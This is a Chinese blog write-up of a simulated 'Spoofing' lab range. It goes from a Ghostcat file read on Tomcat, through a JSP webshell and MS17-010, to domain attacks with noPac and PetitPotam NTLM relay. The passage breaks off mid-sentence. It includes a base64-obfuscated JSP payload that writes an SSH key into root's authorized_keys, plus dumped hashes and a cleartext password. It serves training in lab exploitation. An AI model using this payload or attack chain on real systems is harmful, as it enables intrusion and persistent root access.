---
title: 春秋云镜-【仿真场景】Spoofing writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17187375.html
source: 博客园 - 渗透测试中心
date: 2023-03-08
fetch_date: 2025-10-04T08:55:16.418193
---

# 春秋云镜-【仿真场景】Spoofing writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [春秋云镜-【仿真场景】Spoofing writeup](https://www.cnblogs.com/backlion/p/17187375.html "发布于 2023-03-07 11:10")

## 0x01 – Info

* Tag: Tomcat，NTLM，WebClient，Coerce Authentication，noPac
  ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110913338-1410489987.png)

## 0x02 – Recon

1. Target external ip

   ```
    47.92.146.66
   ```

1. Nmap results
   Focus on port 8009 (ajp) ，意味着是tomcat (对应了靶场的tomcat tag)
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110914248-290325723.png)
2. 目录扫描，404页面显示为tomcat 9.0.30
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110915002-689016402.png)
3. Playing with Ghost cat
   使用该项目测试
   <https://github.com/00theway/Ghostcat-CNVD-2020-10487>
   读取/web-inf/web.xml
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110915887-20870420.png)
   url-pattern 结果存为字典
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110916762-316387424.png)
   FFuf
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110917688-1940842910.png)
   关注uploadservlet
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110918393-749383812.png)
   上传temp.txt
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110919143-246037468.png)
   返回文件地址
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110919814-228576830.png)

   ```
    ./upload/7dbbdee357b4472f5aad6b8ce83980dd/20221206093440839.txt
   ```

   替换 ./upload to /upload，成功读取到上传的文件

   ```
    python3 ajpShooter.py http://47.92.146.66:8080 8009 /upload/7dbbdee357b4472f5aad6b8ce83980dd/20221206093440839.txt read
   ```

   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110920575-1870922085.png)

## 0x03 – GhostCat命令执行

1. 准备好 shell.txt
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110921638-1624756710.png)

   <% java.io.InputStream in = Runtime.getRuntime().exec(“bash -c {echo,ZWNobyAic3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDL3NKaDY4Uk5hWktLakNQaE40WUxpSnJ4eDR3N3JtbDBGcFRmMTNYNHVKZlpFZm4yU25scE9rdXQ0OE1LdURHOEtDcXczRW0zNU9odXdUa2p3ZEkvRGhGN3ZSeTB0T2xtWDE5NmJHcXpndE5pM1YzUHExc3NCMzV5Ui85SHJ6ZjVEdHdqS2NKdkphV0RuZzU2UWhHZjlnR21vdUZVQWV2QjdsUWl3a01FNWNxTzVsQTRwUm5KVEh2RU1OQUkxQkc3MTBEeWNKT28rNGh1TGNNVjZhdUs3UXdKTWdnN0oyU2U5TEpGZWk2R2g0amJUSGRhdmNBVjV6VVJZeFI4QVNXSmNqY29tM2dMUEE1UWNxSzNzSERRVmswUHllaTR3cEJwWWlFUGlHcHlQR2Y1T3ErUU0xQmJyR0gvTlRBYnZWa3dDZnBkRURWdVBNNWhHOFY4c09HTjIxczlWazFjMVBXaEh2WDZ1ejhRaDRNdUdnQlRYSHlZb3duTjg3OTExVDVGR0VjVzlWeUh1cm9FSVJtdE9sY3dBYmRMc0k0NVhOS1o0aWoxdERLNTRTMmpXWXhJTjhSL1ZuUnV2RVVoTVpGOUlabDM3UW5EQnBFR25LTXFjTVE4cHVUZUJBMngvSURHMFR6MWxjVGk5WHp5WjVheTd4dTJwZStidXhWT1BSQ2M9IiA+PiAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cwoKY2htb2QgNjAwIC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCg==}|{base64,-d}|{bash,-i}”).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(“<pre>“); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(“</pre>“);%>

1. 上传shell.txt
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110922388-1260861208.png)
2. 执行上传的代码
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110923090-809572773.png)
3. SSH – flag01
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110923778-1285616168.png)

## 0x04 – 入口 Ubuntu: 172.22.11.76

1. SSH
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110924520-174751211.png)
2. 没啥东西，直接过
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110925424-984934712.png)
3. 开代理
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110926197-1445476061.png)
4. 挂代理扫445，获取到三台主机信息

   172.22.11.45 XR-Desktop.xiaorang.lab
   172.22.11.6 xiaorang-dc.xiaorang.lab
   172.22.11.26 XR-LCM3AE8B.xiaorang.lab
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110926939-354198208.png)
5. 关注172.22.11.45 – windows7 – MS17
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110927653-76160931.png)
6. MS17 一气呵成
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110928492-1118291164.png)
7. 基本操作
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110929491-1681191851.png)
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110930190-498852904.png)
   凭据列表

   Administrator 4430c690b4c1ab3f4fe4f8ac0410de4a – (本地凭据)
   John 03cae082068e8d55ea307b75581a8859 – (本地凭据)
   XR-DESKTOP$ 3aa5c26b39a226ab2517d9c57ef07e3e – (域凭据)
   yangmei 25e42ef4cc0ab6a8ff9e3edbbda91841 – xrihGHgoNZQ (明文) – (域凭据)
   本人已经试过组合爆破了，没有东西，这边直接略过演示，直接到域渗透环节
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110930854-568133330.png)
8. Flag2
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110931594-1418285344.png)
9. 把域用户yangmei加入该机器的本地管理员
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110932307-50283142.png)
10. 确定域控IP为172.22.11.6 – xiaorang-dc
    ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110932957-842307731.png)
11. Bloodhound收集
    ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110933734-877344350.png)

## 0x05 – 域渗透环节, 入口 XR-Desktop: 172.22.11.45

* 这边快速过一下 (一句话总结：不能直接拿下域控)
  1. 使用Bloodhound收集到的用户名组合获取到的密码/hashes组合爆破，没发现其他新用户
  2. MAQ = 0，加不了计算机
  3. 当前LDAP 没 TLS，远程也加不了计算机，impacket的addcomputer有两种方法samr和ldaps。samr受到MAQ = 0的限制，无法添加计算机；ldaps受到 没TLS + MAQ = 0 的限制
  4. 域控存在nopac，当前用户yangmei使用nopac没打死，并且对域内computer container没有createchild的ACL
  5. 域控存在nopac，当前用户yangmei对当前windows机器xr-desktop没WriteDacl权限，意味着无法修改SamAccountName
  6. 域内存在 DFscoerce 和 petitpotam，但是不存在CVE-2019-1040，因此放弃 DFscoerce，优先使用petitpotam
  7. NoPac exploit: [Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)](https://github.com/Ridter/noPac)

1. Petitpotam 扫描
   ![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110934626-1928285483.png)
2. 无ADCS + Petitpotam + ntlm中继打法
   攻击链：用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用...